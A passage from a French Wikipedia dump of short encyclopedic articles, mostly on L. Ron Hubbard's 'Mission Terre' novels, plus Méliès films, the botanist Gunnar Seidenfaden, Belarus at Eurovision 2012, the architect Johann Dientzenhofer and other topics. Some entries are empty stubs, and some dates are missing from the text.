Pour se débarrasser de Gunsalmo Silva, le tueur mafieux capturé, envoyé sur Voltar, hypnotisé aux techniques de combat voltariennes, pris comme garde du corps par Utanc, Soltan Gris l'engage pour tuer le directeur de la CIA. Il espère que, ce faisant, Gunsalmo Silva sera tué par les gardes du corps de ce dernier.
Pour empêcher Heller de réaliser son plan, Soltan Gris embauche deux tueurs de la Mafia afin de blesser grièvement l'ingénieur de combat.
Prologues.
Extrait de la « Mise en garde du censeur voltarien ».
Le roman est précédé par une « Mise en garde du Censeur voltarien », dénommé Lord Invay. La première phrase de ce prologue et les deux dernières phrases sont les suivantes :
Extrait de la « préface du traducteur voltarien ».
Le roman comprend une « préface du traducteur voltarien », un robot prénommé 54-Charli neuf. Le robot-traducteur explique notamment quelles furent les difficultés de sa tâche.

</doc>
<doc id="6806642" url="https://fr.wikipedia.org/wiki?curid=6806642" title="BHNS de Metz">
BHNS de Metz



</doc>
<doc id="6806655" url="https://fr.wikipedia.org/wiki?curid=6806655" title="BV Veendam">
BV Veendam



</doc>
<doc id="6806657" url="https://fr.wikipedia.org/wiki?curid=6806657" title="Rotonde de Mosta">
Rotonde de Mosta



</doc>
<doc id="6806658" url="https://fr.wikipedia.org/wiki?curid=6806658" title="Aspidoscelis gularis septemvittata">
Aspidoscelis gularis septemvittata



</doc>
<doc id="6806659" url="https://fr.wikipedia.org/wiki?curid=6806659" title="Lobatocerebrum">
Lobatocerebrum

Lobatocerebrum ou « Lobatocerebron » (orthographe francisé ), est un genre d'animaux interstitiels décrits en 1980 par Rieger , placés alors dans les annélides, voir au sein des clitellates. Leur morphologie unique permet cependant de douter de leurs affinités avec les annélides . Jusqu'à trois espèces de ce genre sont supposées mais seule "Lobatocerebrum psammicola" a été formellement décrite et nommée. Ces organismes se retrouvent dans le sable hétérogène de taille intermédiaire à grossier de 20 à de profondeur. L'adulte mesure environ de long et de large.

</doc>
<doc id="6806661" url="https://fr.wikipedia.org/wiki?curid=6806661" title="N,O-Bis(triméthylsilyl)trifluoroacétamide">
N,O-Bis(triméthylsilyl)trifluoroacétamide

Le "N","O"-bis(triméthylsilyl)trifluoroacétamide (BSTFA) est un composé chimique de formule semi-développée . Il est utilisé en chimie organique pour lier un groupe triméthylsilyle sur un groupe fonctionnel labile afin de protéger ce dernier lors de réactions d'analyse ou de synthèse ultérieures.

</doc>
<doc id="6806662" url="https://fr.wikipedia.org/wiki?curid=6806662" title="Lobatocerebridae">
Lobatocerebridae



</doc>
<doc id="6806663" url="https://fr.wikipedia.org/wiki?curid=6806663" title="Métrique kählérienne">
Métrique kählérienne



</doc>
<doc id="6806667" url="https://fr.wikipedia.org/wiki?curid=6806667" title="Une affaire très étrange">
Une affaire très étrange

Une affaire très étrange (titre original : "An Alien Affair") est un roman de science-fiction écrit par L. Ron Hubbard.
Il s'agit du quatrième tome du cycle de science-fiction intitulé "Mission Terre", qui comprend les parties 29 à 35 de la suite romanesque, sur 92 parties au total. 
Dans sa version française en livre de poche, le roman comporte 278 pages et est le plus court de la série, à quasi-égalité avec le tome 10, "Requiem pour une planète", qui en comporte 277.
Publications.
Le roman a été publié aux États-Unis en .
Il a été publié en France en 1989 aux éditions Presses de la Cité en grand format, puis en 1992 en format livre de poche aux éditions Presses Pocket sous le n°5443.
Titre du roman.
Dans sa version originale, le roman a pour titre "An Alien Affair", qui a un double sens :
Dans ce second sens, trois extraterrestres vivent en effet une liaison sentimentale « étrange » :
Le titre a été traduit sous l'expression "Une affaire très étrange", ce qui est un choix rationnel mais qui rend mal l'idée de liaison sentimentale.
Thème de la série.
Sur la planète Voltar, le chef des services secrets, le sinistre et mégalomane Lombar Hisst, a décidé d'envoyer sur la planète Blito P-3 (la Terre) un agent secret sans états d'âmes, Soltan Gris, chargé de le ravitailler en drogue, qu'il revend secrètement sur Voltar. Il charge aussi Soltan Gris de neutraliser Jettero Heller, un ingénieur de combat de la Flotte envoyé sur la Terre pour aider les humains à cesser de dégrader leur planète en la polluant et en la surexploitant. En effet, pour garantir l'approvisionnement régulier en drogue, il ne faut surtout pas que le gouvernement voltarien apprenne que les humains détruisent si rapidement leur planète qu'une intervention militaire s'avère nécessaire.
Arrivé sur Terre, Soltan Gris, être cupide et sans scrupules, va complètement et involontairement rater sa mission…
Les romans de la série ne sont pas dénués d'un certain humour sarcastique, lié en particulier au fait que le « méchant », Soltan Gris, qui est le narrateur du récit :
Prologues.
Extraits de la « Mise en garde du censeur voltarien ».
Le roman est précédé par une « Mise en garde du Censeur voltarien », dénommé Lord Invay. Voici le début et la fin de sa mise en garde :
Extraits de la « préface du traducteur voltarien ».
Le roman comprend une « préface du traducteur voltarien », un robot prénommé 54-Charli neuf. Le robot-traducteur explique notamment quelles furent les difficultés de sa tâche.

</doc>
<doc id="6806673" url="https://fr.wikipedia.org/wiki?curid=6806673" title="L'Empire de la peur">
L'Empire de la peur

L'Empire de la peur (titre original : "Fortune of Fear") est un roman de science-fiction écrit par L. Ron Hubbard.
Il s'agit du cinquième tome du cycle de science-fiction intitulé "Mission Terre", qui comprend les parties 36 à 42 de la suite romanesque, sur 92 parties au total.
Publications.
Le roman a été publié aux États-Unis en .
Il a été publié en France en 1989 aux éditions Presses de la Cité en grand format, puis en 1992 aux éditions Presses Pocket en format livre de poche.
Thème de la série.
Sur la planète Voltar, le chef des services secrets, le sinistre et mégalomane Lombar Hisst, a décidé d'envoyer sur la planète Blito P-3 (la Terre) un agent secret sans états d'âmes, Soltan Gris, chargé de le ravitailler en drogue, qu'il revend secrètement sur Voltar. Il charge aussi Soltan Gris de neutraliser Jettero Heller, un ingénieur de combat de la Flotte envoyé sur la Terre pour aider les humains à cesser de dégrader leur planète en la polluant et en la surexploitant. En effet, pour garantir l'approvisionnement régulier en drogue, il ne faut surtout pas que le gouvernement voltarien apprenne que les humains détruisent si rapidement leur planète qu'une intervention militaire s'avère nécessaire.
Arrivé sur Terre, Soltan Gris, être cupide et sans scrupules, va complètement et involontairement rater sa mission…
Les romans de la série ne sont pas dénués d'un certain humour sarcastique, lié en particulier au fait que le « méchant », Soltan Gris, qui est le narrateur du récit :
Résumé du roman.
La comtesse Krak, à bord du "Remorqueur" 1, arrive sur la base turque de l'Appareil.
Soltan Gris, afin de contrôler la comtesse Krak, ordonne au Prahd Bittlestiffender de lui implanter dans le crâne les mêmes puces électroniques que celles implantées à Jettero Heller dans le tome 1. Le sinistre Crobe, arrivé sur le même vol spatial que la comtesse, subit le même sort.
Par la suite, la comtesse prend l'avion pour rejoindre Heller aux États-Unis, non sans s'être fait remettre par Gris, dans un moment d'égarement, la carte de crédit Squeeze qui lui avait donné tant d'inquiétudes dans le tome précédent. Krak retrouve Heller, et les deux amants revivent leur relation sentimentale torride.
Un événement soudain vient perturber les conditions de travail de Soltan Gris en Turquie : il apprend que des femmes ont été violées par son chauffeur et que leurs maris souhaitent, en représailles, le tuer lui, Soltan. Il se sent obligé de quitter précipitamment la Turquie. Lors de sa fuite, il lance plusieurs bombes et tue plusieurs personnes, . Arrivé sur le sol américain, de là, pense-t-il, il pourra mieux surveiller Heller et Krak.
Pour récupérer l'argent que Miss Pinch a détourné, Gris la suit jusque chez elle. Là, il la prend en otage ainsi que sa compagne lesbienne, Candy Réglisse. Puis Gris viole sauvagement les deux femmes, qui découvrent à cette occasion qu'elles aiment être prises par un homme. Elles proposent à Gris de l'héberger afin qu'il ait des relations intimes avec elles tous les soirs. Ce dernier accepte.
La comtesse Krak apprend que Miss Simmons met des bâtons dans les roues de la carrière de Jettero Heller. Elle se rend chez elle et, grâce à un hypnocasque, la reconditionne de manière que Miss Simmons rejette sa personnalité de femme acariâtre et méchante, et qu'elle adore désormais Jettero. Gris, qui voit et entend ce que fait la comtesse, tente bien d'envoyer des policiers au domicile de son alliée Miss Simmons, mais Krak parvient non seulement à mener à bien son hypnose sur Miss Simmons, mais aussi à se débarrasser des policiers.
Soltan Gris se promet alors de tout mettre en œuvre pour se débarrasser définitivement de la comtesse Krak.
Prologues.
Extrait de la « Mise en garde du censeur voltarien ».
Le roman est précédé par une « Mise en garde du Censeur voltarien », dénommé Lord Invay.
Extrait de la « préface du traducteur voltarien ».
Le roman comprend une « préface du traducteur voltarien », qui est un robot prénommé 54-Charli neuf. Le robot-traducteur explique notamment quelles furent les difficultés de sa tâche.

</doc>
<doc id="6806681" url="https://fr.wikipedia.org/wiki?curid=6806681" title="Objectif Mort">
Objectif Mort

Objectif Mort, dont le titre original est "Death Quest", est un roman de science-fiction écrit par L. Ron Hubbard.
Il s'agit du sixième tome du cycle de science-fiction intitulé "Mission Terre", qui comprend les parties 43 à 51 de la suite romanesque, sur un total de 92 parties.
Publications.
Le roman a été publié aux États-Unis en janvier 1987.
Il a été publié en France en 1989 aux Presses de la Cité en grand format, puis en 1992 aux éditions Presses Pocket en format livre de poche.
Thème de la série.
Sur la planète Voltar, le chef des services secrets, le sinistre et mégalomane Lombar Hisst, a décidé d'envoyer sur la planète Blito P-3 (la Terre) un agent secret sans états d'âmes, Soltan Gris, chargé de le ravitailler en drogue, qu'il revend secrètement sur Voltar. Il charge aussi Soltan Gris de neutraliser Jettero Heller, un ingénieur de combat de la Flotte envoyé sur la Terre pour aider les humains à cesser de dégrader leur planète en la polluant et en la surexploitant. En effet, pour garantir l'approvisionnement régulier en drogue, il ne faut surtout pas que le gouvernement voltarien apprenne que les humains détruisent si rapidement leur planète qu'une intervention militaire s'avère nécessaire.
Arrivé sur Terre, Soltan Gris, être cupide et sans scrupules, va complètement et involontairement rater sa mission…
Les romans de la série ne sont pas dénués d'un certain humour sarcastique, lié en particulier au fait que le « méchant », Soltan Gris, qui est le narrateur du récit :
Prologues.
Extrait de la « Mise en garde du censeur voltarien ».
Le roman est précédé par une « Mise en garde du Censeur voltarien », dénommé Lord Invay.
Extrait de la « préface du traducteur voltarien ».
Le roman comprend une « préface du traducteur voltarien », qui est un robot prénommé 54-Charli neuf. Le robot-traducteur explique notamment quelles furent les difficultés de sa tâche.

</doc>
<doc id="6806684" url="https://fr.wikipedia.org/wiki?curid=6806684" title="L'honneur est satisfait">
L'honneur est satisfait



</doc>
<doc id="6806685" url="https://fr.wikipedia.org/wiki?curid=6806685" title="L'Hôtel des voyageurs de commerce">
L'Hôtel des voyageurs de commerce

L'Hôtel des voyageurs de commerce est un film muet de Georges Méliès sorti en 1906.

</doc>
<doc id="6806687" url="https://fr.wikipedia.org/wiki?curid=6806687" title="Destination vengeance">
Destination vengeance

Destination vengeance, dont le titre original est "Voyage of Vengeance", est un Roman de science-fiction écrit par L. Ron Hubbard.
Il s'agit du septième tome du cycle de science-fiction intitulé "Mission Terre", qui comprend les parties 52 à 61 de la suite romanesque, sur un total de 92 parties.
Publications.
Le roman a été publié aux États-Unis en mai 1987.
Il a été publié en France en 1990 aux Presses de la Cité en grand format, puis en 1993 aux éditions Presses Pocket en format livre de poche.
Thème de la série.
Sur la planète Voltar, le chef des services secrets, le sinistre et mégalomane Lombar Hisst, a décidé d'envoyer sur la planète Blito P-3 (la Terre) un agent secret sans états d'âmes, Soltan Gris, chargé de le ravitailler en drogue, qu'il revend secrètement sur Voltar. Il charge aussi Soltan Gris de neutraliser Jettero Heller, un ingénieur de combat de la Flotte envoyé sur la Terre pour aider les humains à cesser de dégrader leur planète en la polluant et en la surexploitant. En effet, pour garantir l'approvisionnement régulier en drogue, il ne faut surtout pas que le gouvernement voltarien apprenne que les humains détruisent si rapidement leur planète qu'une intervention militaire s'avère nécessaire.
Arrivé sur Terre, Soltan Gris, être cupide et sans scrupules, va complètement et involontairement rater sa mission…
Les romans de la série ne sont pas dénués d'un certain humour sarcastique, lié en particulier au fait que le « méchant », Soltan Gris, qui est le narrateur du récit :
Résumé du roman.
Lorsque le roman se termine, Soltan Gris semble avoir parfaitement rempli sa mission : la comtesse Krak a été assassinée ; Jettero Heller, qui la croit disparue dans le crash de l'avion, retourne aux États-Unis dans un état proche de la prostration et de la dépression. Soltan Gris exulte de joie.
Prologues.
Extrait de la « Mise en garde du censeur voltarien ».
Le roman est précédé par une « Mise en garde du Censeur voltarien », dénommé Lord Invay.
Extrait de la « préface du traducteur voltarien ».
Le roman comprend une « préface du traducteur voltarien », qui est un robot prénommé 54-Charli neuf. Le robot-traducteur explique notamment quelles furent les difficultés de sa tâche.

</doc>
<doc id="6806688" url="https://fr.wikipedia.org/wiki?curid=6806688" title="Jack le ramoneur">
Jack le ramoneur

Jack le ramoneur est un film muet de Georges Méliès sorti en 1906.
Synopsis.
Jack, un garçon kidnappé travaillant comme ramoneur, est brutalement traité et souvent battu par son violent employeur. S'endormant après une longue journée, il rêve de sa mère perdue et des contes de fées qu'il a entendu. Les souvenirs se transforment en un voyage à travers le monde des rêves, dirigé par la fée des rêves, qui transforme Jack en un roi au milieu des célébrations d'une cour royale. Le rêve se termine brusquement quand Jack est réveillé par son employeur pour commencer sa journée de travail.
Jack est occupé à travailler quand, derrière des briques à l'intérieur d'une cheminée, il tombe sur une boîte pleine d'or et d'argent cachée depuis de nombreuses années. L'employeur tente de prendre possession du trésor mais Jack s'enfuit. Une poursuite s'ensuit à travers le quartier, avec des citadins et des serviteurs. Jack s'échappe et se cache juste avant que son employeur tombe dans une fosse. Le trouvant couvert de boue, les spectateurs le plongent dans un tonneau d'eau.
Par chance, Jack réussit à rencontrer sa famille et peut rentrer chez lui. Entouré de richesses, il pardonne à son ancien employeur.

</doc>
<doc id="6806689" url="https://fr.wikipedia.org/wiki?curid=6806689" title="Le Maestro Do-mi-sol-do">
Le Maestro Do-mi-sol-do



</doc>
<doc id="6806690" url="https://fr.wikipedia.org/wiki?curid=6806690" title="La Magie à travers les âges">
La Magie à travers les âges



</doc>
<doc id="6806691" url="https://fr.wikipedia.org/wiki?curid=6806691" title="Catastrophe (roman)">
Catastrophe (roman)

Catastrophe, dont le titre original est "Disaster", est un roman de science-fiction écrit par L. Ron Hubbard.
Il s'agit du huitième tome du cycle de science-fiction intitulé "Mission Terre", qui comprend les parties 62 à 70 de la suite romanesque, sur un total de 92 parties.
Publications.
Le roman a été publié aux États-Unis en juin 1987.
Il a été publié en France en 1990 aux Presses de la Cité en grand format, puis en 1993 aux éditions Presses Pocket en format livre de poche.
Thème de la série.
Sur la planète Voltar, le chef des services secrets, le sinistre et mégalomane Lombar Hisst, a décidé d'envoyer sur la planète Blito P-3 (la Terre) un agent secret sans états d'âmes, Soltan Gris, chargé de le ravitailler en drogue, qu'il revend secrètement sur Voltar. Il charge aussi Soltan Gris de neutraliser Jettero Heller, un ingénieur de combat de la Flotte envoyé sur la Terre pour aider les humains à cesser de dégrader leur planète en la polluant et en la surexploitant. En effet, pour garantir l'approvisionnement régulier en drogue, il ne faut surtout pas que le gouvernement voltarien apprenne que les humains détruisent si rapidement leur planète qu'une intervention militaire s'avère nécessaire.
Arrivé sur Terre, Soltan Gris, être cupide et sans scrupules, va complètement et involontairement rater sa mission…
Les romans de la série ne sont pas dénués d'un certain humour sarcastique, lié en particulier au fait que le « méchant », Soltan Gris, qui est le narrateur du récit :
Titre du roman.
Le roman est intitulé "Catastrophe" ("Disaster" en version anglaise) en raison des échecs subis par trois personnages importants de la suite romanesque :
Prologues.
Extrait de la « Mise en garde du censeur voltarien ».
Le roman est précédé par une « Mise en garde du Censeur voltarien », dénommé Lord Invay. 
Extrait de la « préface du traducteur voltarien ».
Le roman comprend une « préface du traducteur voltarien », qui est un robot prénommé 54-Charli neuf. Le robot-traducteur explique notamment quelles furent les difficultés de sa tâche.

</doc>
<doc id="6806692" url="https://fr.wikipedia.org/wiki?curid=6806692" title="Australia Zoo">
Australia Zoo

L'Australia Zoo est un parc zoologique australien situé à Beerwah, dans le Queensland. Ouvert le , il présente plus de animaux sur une quarantaine d'hectares.

</doc>
<doc id="6806694" url="https://fr.wikipedia.org/wiki?curid=6806694" title="Liste de films tournés dans le département du Haut-Rhin">
Liste de films tournés dans le département du Haut-Rhin

Un certain nombre d'œuvres cinématographiques et télévisuelles ont été tournés dans le département du Haut-Rhin.
Voici une liste à compléter de films, téléfilms, feuilletons télévisés, films documentaires... tournés dans le département du Haut-Rhin, classés par commune et lieu de tournage et date de diffusion.

</doc>
<doc id="6806699" url="https://fr.wikipedia.org/wiki?curid=6806699" title="Gunnar Seidenfaden">
Gunnar Seidenfaden

Gunnar Seidenfaden, né le et mort le , est un diplomate danois qui fut également botaniste, spécialiste de la flore d'Asie du Sud-Est.
Biographie.
Gunnar Seidefaden étudie la botanique à l'université de Copenhague à la Faculté de biologie de 1926 à 1934. Il participe bientôt à des expéditions botaniques au Groenland (possession danoise). À partir de 1928, il y passe six étés, en partie comme botaniste de l'expédition (1931-1934) cofinancée par la Fondation Carlsberg et la couronne danoise et dirigée par Lauge Koch, à laquelle participent nombre de naturalistes, botanistes, géologues, zoologistes, etc. Malheureusement, Gunnar Seidenfaden échoue à l'examen de "magisterkonferens" en botanique et il se tourne vers des études d'économie et de sciences politiques. Il reçoit le diplôme de candidat en sciences politiques en 1940. Ensuite, il entre dans la carrière diplomatique.
Il est ambassadeur en Thaïlande de 1955 à 1959, puis ambassadeur en URSS de 1959 à 1961, puis il dirige le bureau juridique du ministère des Affaires étrangères, jusqu'en 1967. Il représente le Danemark dans des conférences internationales concernant l'environnement. Il assiste ainsi à la convention de Washington (1973), à la convention d'Helsinki (1979) et à la convention de Berne (1979).
Depuis son poste en Thaïlande, il devient expert dans le domaine des orchidées et de la flore du sud-est asiatique et fait parvenir de nombreux spécimens au jardin botanique de Copenhague. Il fait don de sa collection de plus de dix mille spécimens (ainsi que des illustrations de Katja Anker et d'autres auteurs) à l'université de Copenhague qui administre le jardin botanique de Copenhague. Il collabore avec le "Royal Thai Forest Department" avec lequel il organise de nombreuses expéditions de collectes de plantes dans les années 1980. Parmi ses publications concernant les orchidées, l'on peut distinguer "The Orchids of Thailand – A Preliminary List" (en collaboration avec T. Smitinand), "The Orchids of Indochina" (1992), "The Orchids of Peninsular Malaysia and Singapore" (en collaboration avec Jeffrey Wood, 1992) et " Orchid Genera in Thailand" vol. I- XIV. Ses ouvrages sont strictement taxonomiques et floristiques, mais illustrés avec ses propres dessins reprenant des parties des fleurs au microscope.
En 1938, il remporte un prix au Danemark pour le meilleur ouvrage scientifique de l'année grâce à son livre "Moderne Arktisk Forskning" à propos de son expédition de l'Arctique.
Gunnar Seidefaden a décrit au moins cent-vingt nouvelles espèces.
Hommages.
Le genre éteint de requins "Fadenia", remontant au Permien, a également été baptisé de son nom en son honneur.

</doc>
<doc id="6806701" url="https://fr.wikipedia.org/wiki?curid=6806701" title="Seidenf.">
Seidenf.



</doc>
<doc id="6806702" url="https://fr.wikipedia.org/wiki?curid=6806702" title="Château d'Andělská Hora">
Château d'Andělská Hora

Le château d'Andělská Hora (originellement appelé "Engelsburg") est un château en ruines située dans le village homonyme à au sud-est de Karlovy Vary, en République tchèque.
Les ruines se trouvent sur un rocher qui domine le village juste au-dessous. Il a été fondé à la fin du par Boreš z Rýznburk, un noble de la famille de Rýznburk pour défendre ses territoires.
Le château a été détruit pendant la guerre de Trente Ans et abandonné au .

</doc>
<doc id="6806703" url="https://fr.wikipedia.org/wiki?curid=6806703" title="Noire Victoire">
Noire Victoire

Noire Victoire, dont le titre original est "Villainy Victorious", est un roman de science-fiction écrit par L. Ron Hubbard.
Il s'agit du neuvième et avant-dernier tome du cycle de science-fiction intitulé "Mission Terre", qui comprend les parties 71 à 81 de la suite romanesque, qui en comprend 92 au total.
Publications.
Le roman a été publié aux États-Unis en septembre 1987.
Il a été publié en France en 1990 aux Presses de la Cité en grand format, puis en 1993 aux éditions Presses Pocket en format livre de poche.
Thème de la série.
Sur la planète Voltar, le chef des services secrets, le sinistre et mégalomane Lombar Hisst, a décidé d'envoyer sur la planète Blito P-3 (la Terre) un agent secret sans états d'âmes, Soltan Gris, chargé de le ravitailler en drogue, qu'il revend secrètement sur Voltar. Il charge aussi Soltan Gris de neutraliser Jettero Heller, un ingénieur de combat de la Flotte envoyé sur la Terre pour aider les humains à cesser de dégrader leur planète en la polluant et en la surexploitant. En effet, pour garantir l'approvisionnement régulier en drogue, il ne faut surtout pas que le gouvernement voltarien apprenne que les humains détruisent si rapidement leur planète qu'une intervention militaire s'avère nécessaire.
Arrivé sur Terre, Soltan Gris, être cupide et sans scrupules, va complètement et involontairement rater sa mission…
Les romans de la série ne sont pas dénués d'un certain humour sarcastique, lié en particulier au fait que le « méchant », Soltan Gris, qui est le narrateur du récit :
Prologues.
Extrait de la « Mise en garde du censeur voltarien ».
Le roman est précédé par une « Mise en garde du Censeur voltarien », dénommé Lord Invay.
Extrait de la « préface du traducteur voltarien ».
Le roman comprend une « préface du traducteur voltarien », qui est un robot prénommé 54-Charli neuf. Le robot-traducteur explique notamment quelles furent les difficultés de sa tâche.

</doc>
<doc id="6806709" url="https://fr.wikipedia.org/wiki?curid=6806709" title="Delta cancrides">
Delta cancrides

Les Delta Cancrides sont une pluie de météores d'intensité moyenne s'étalant du au , la période principale se déroulant du au . 
Origine.
Cette pluie de météores fut découverte en 1872, mais la première confirmation étayée du phénomène n'eut lieu qu'en 1971. L'origine de cette pluie de météores est inconnue ; il a été suggéré qu'elle était liée à l'orbite de l'astéroïde .
Observation.
Le radiant est situé dans la constellation du Cancer, près de Delta Cancri. Elle culmine chaque année le , avec seulement quatre météores par heure. 

</doc>
<doc id="6806710" url="https://fr.wikipedia.org/wiki?curid=6806710" title="Ossernenon">
Ossernenon



</doc>
<doc id="6806711" url="https://fr.wikipedia.org/wiki?curid=6806711" title="Biélorussie au Concours Eurovision de la chanson 2012">
Biélorussie au Concours Eurovision de la chanson 2012

La Biélorussie a participé au Concours Eurovision de la chanson 2012 et a sélectionné sa chanson et son artiste à travers une sélection nationale intitulé "Eurofest 2012" qui comprend une demi-finale et une finale et qui est organisée par le diffuseur biélorusse BTRC. C'est le groupe Litesound qui a remporté cette sélection et qui représente le pays à Bakou avec la chanson "We Are the Heroes", écrite par Vladimir et Dmitry Karyakin.
Eurofest 2012.
Le 18 octobre 2011, BTRC débute l'appel aux chansons pour sa sélection nationale "Eurofest 2012". Après deux années de pause, la sélection nationale Eurofest est de retour pour sélectionner le représentant biélorusse. Les chansons doivent être envoyés entre le et le 25 novembre 2011 pour essayer de faire partie de la sélection.
Après cela, un jury a choisi 15 chansons qui ont été présentées lors d'une demi-finale qui a eu lieu le 21 décembre 2011. À la suite de cette demi-finale, cinq chansons se sont qualifiés pour la finale qui a lieu le 14 février 2012. Lors de la finale, le vainqueur est déterminé par le vote du public (50 %) et par un jury professionnel (50 %). Des journaux spéciaux Eurofest sont également diffusés durant la durée de la sélection.
Le 24 février 2012, le président biélorusse a conduit une enquête qui a mené à la victoire de Alena Lanskaya à l'Eurofest 10 jours plus tôt. En effet, la rumeur disait qu'elle et ses producteurs avaient truqué le télévote afin de recevoir les 12 points de celui-ci et de gagner ainsi la sélection. Le président ordonne une enquête immédiate et il est plus tard confirmé que la rumeur était vraie. Par conséquent, le 26 février, Alena Lanskaya est disqualifié. Litesound, qui avait obtenu la seconde place lors de l'Eurofest, sont choisis en interne le 27 février pour être les nouveaux représentants de la Biélorussie au Concours Eurovision de la chanson 2012.
À l'Eurovision.
La Biélorussie participe à la deuxième demi-finale et passe en entre Malte et le Portugal.
Lors de cette demi-finale, le pays termine à la avec 35 points et ne se qualifie donc pas pour la finale.

</doc>
<doc id="6806713" url="https://fr.wikipedia.org/wiki?curid=6806713" title="Johann Dientzenhofer">
Johann Dientzenhofer

Johann Dientzenhofer (né le à St. Margarethen, aujourd'hui commune de Brannenburg, mort le à Bamberg) est un maître d'œuvre et architecte allemand de l'époque baroque.
Biographie.
Il est le plus jeune enfant de Georg Dientzenhofer, un paysan de montagne, et de son épouse Barbara Thanner. La famille est pauvre, les enfants doivent travailler. Pourtant des enfants deviendront architectes : les frères , Christoph, Leonhard, et le neveu Kilian Ignace.
À 15 ans, il assiste à Prague au mariage de sa sœur Anna avec Wolfgang Leuthner, parent de l'architecte Abraham Leuthner. On pense qu'il apprend alors la taille de pierre auprès de lui, Carlo Lurago ou Jean-Baptiste Mathey. En tout cas, il travaille surtout avec son frère Christoph. Il fait partie de l'équipe qui construit l'église Sainte-Marie de Malá Strana. Il s'est probablement aussi marié à Prague.
Il est appelé par son frère Leonhard à Bamberg, il devient contremaître sur le chantier de l' en 1696 et du palais de Bamberg en 1698. Le prince-évêque Lothar Franz von Schönborn lui finance un voyage d'étude en Italie.
À son retour en , il reçoit la commande du palais épiscopal de Fulda de puis celle de la cathédrale Saint-Sauveur, consacrée en 1712. Il conçoit aussi la ainsi que les châteaux de Bieberstein et de Geisa.
Après la mort de son frère Leonhard, Lothar Franz von Schönborn fait de Johann son architecte de cour le et lui fait reprendre ses chantiers. En 1713, il se rend à Prague et à Vienne pour concevoir avec Lukas von Hildebrandt le château Weissenstein à Pommersfelden. Il reconstruit aussi l'. Sur la recommandation du prince-évêque, il participe à la construction entre 1720 et 1723 de la Résidence de Würzburg conçue par Johann Balthasar Neumann. Il conçoit l'église de l'abbaye de Banz.
Malgré le succès, il en tire peu de profit financier ; à plusieurs reprises, il sous-estime le coût de ses chantiers et doit se porter garant de la différence. À sa mort en 1726, il laisse un héritage insuffisant à sa femme Maria Eleonore et ses enfants. Son fils deviendra architecte.

</doc>
<doc id="6806714" url="https://fr.wikipedia.org/wiki?curid=6806714" title="Subtivals">
Subtivals

Subtivals est un logiciel libre de surtitrage, il fonctionne sur les systèmes d'exploitation Windows, Linux et Mac OS X et est distribué sous licence GNU GPL.
Utilisation.
Les fichiers de sous-titres, au format SRT ou ASS, sont projetés en surimpression sur l'écran, permettant le sous-titrage de n'importe quel support.
Subtivals a été créé dans le but de fournir un sous-titrage de qualité pour le public sourd ou mal-entendant. Il supporte les styles, les couleurs et le positionnement dynamique. En complément du mode de fonctionnement automatisé, il permet de garder totalement le contrôle sur la projection : pause, sauts, vitesse, apparence, etc.

</doc>
<doc id="6806718" url="https://fr.wikipedia.org/wiki?curid=6806718" title="Requiem pour une planète">
Requiem pour une planète

Requiem pour une planète (titre original : "The Doomed Planet" - « La Planète condamnée ») est un roman de science-fiction écrit par L. Ron Hubbard.
Il s'agit du dixième et dernier tome du cycle de science-fiction intitulé "Mission Terre", qui comprend les parties 82 à 92 de la suite romanesque. 
Dans sa version livre de poche, le roman comporte 277 pages et est le plus court de la série, quasiment à égalité avec le tome 4, "Une affaire très étrange", qui en comporte 278.
Publications.
Le roman a été publié aux États-Unis en septembre 1987.
Il a été publié en France en 1991 aux Presses de la Cité en grand format, puis en 1994 aux éditions Presses Pocket en format livre de poche.
Thème de la série.
Sur la planète Voltar, le chef des services secrets, le sinistre et mégalomane Lombar Hisst, a décidé d'envoyer sur la planète Blito P-3 (la Terre) un agent secret sans états d'âmes, Soltan Gris, chargé de le ravitailler en drogue, qu'il revend secrètement sur Voltar. Il charge aussi Soltan Gris de neutraliser Jettero Heller, un ingénieur de combat de la Flotte envoyé sur la Terre pour aider les humains à cesser de dégrader leur planète en la polluant et en la surexploitant. En effet, pour garantir l'approvisionnement régulier en drogue, il ne faut surtout pas que le gouvernement voltarien apprenne que les humains détruisent si rapidement leur planète qu'une intervention militaire s'avère nécessaire.
Arrivé sur Terre, Soltan Gris, être cupide et sans scrupules, va complètement et involontairement rater sa mission…
Les romans de la série ne sont pas dénués d'un certain humour sarcastique, lié en particulier au fait que le « méchant », Soltan Gris, qui est le narrateur du récit :
Prologues.
Extrait de la « Mise en garde du Censeur voltarien ».
Le roman est précédé par une « Mise en garde du Censeur voltarien », dénommé Lord Invay. Cet avant-propos débute de la manière suivante :
À présent que la Couronne a autorisé avec magnanimité la publication de cette œuvre tourmentée, extravagante et hyperbolique, que l'on ne vienne pas nous dire que nous n'avons pas été tolérants. La Couronne a clairement exprimé sa position. Ceci constitue un ouvrage de FICTION ABSOLUE.(…)
Extrait de la « préface du traducteur voltarien ».
Le roman comprend une « préface du traducteur voltarien », qui est un robot prénommé 54-Charli neuf. Le robot-traducteur explique notamment quelles furent les difficultés de sa tâche :
Je suis le Cerveau-robot du Traductophone depuis près de six cents ans. À ce jour, j'ai traduit tellement de livres, d'articles, de lettres, de discours, de chansons, de jugements, de chroniques, etc., que je ne peux en tenir le compte. Mais RIEN ne saurait se comparer à ce boulot que je viens de TERMINER. La difficulté, ce n'était pas tant la traduction. Oh, bien sûr, c'est un réel défi que d'avoir à traduire la langue d'une planète qui n'existe pas. Mais ce qui a surtout fait patauger mes circuits, C'EST LA TERRE ! J'ai eu affaire à des pirates, des politiciens, des musiciens, des lords, des plébéiens et même des empereurs. J'ai eu affaire à l'élite dont certains représentants sont à peine plus intelligents qu'une éponge. Je les ai vus de toutes les formes, de toutes les tailles, et de toutes les compositions possibles. Donc, quand je dis que JAMAIS je n'ai rencontré quoi que ce soit qui ressemble à LA TERRE, je sais de quoi je parle. Et si vous avez le moindre doute, lisez ! (…)

</doc>
<doc id="6806721" url="https://fr.wikipedia.org/wiki?curid=6806721" title="Chang Tang">
Chang Tang



</doc>
<doc id="6806727" url="https://fr.wikipedia.org/wiki?curid=6806727" title="Symphonie no 44 de Mozart">
Symphonie no 44 de Mozart

La Symphonie en ré majeur «», , a probablement été écrite par Wolfgang Amadeus Mozart à Rome en 1770.
Histoire.
Il n'existe pas d'autographes des quatre symphonies en ré majeur de Mozart écrites durant la première tournée en Italie (K. 81, , et ), et leur authenticité est douteuse. Une copie de , datée du , attribue la symphonie à Wolfgang. Une lettre du de Mozart à sa sœur indique que Leopold a copié une de ses symphonies (de Mozart) dont l'autographe doit rester à la maison. Un catalogue de Breitkopf &amp; Härtel donne Leopold comme son compositeur, mais la raison de cette erreur pourrait être que c'est Léopold qui leur a présenté l'œuvre et non Wolfgang.
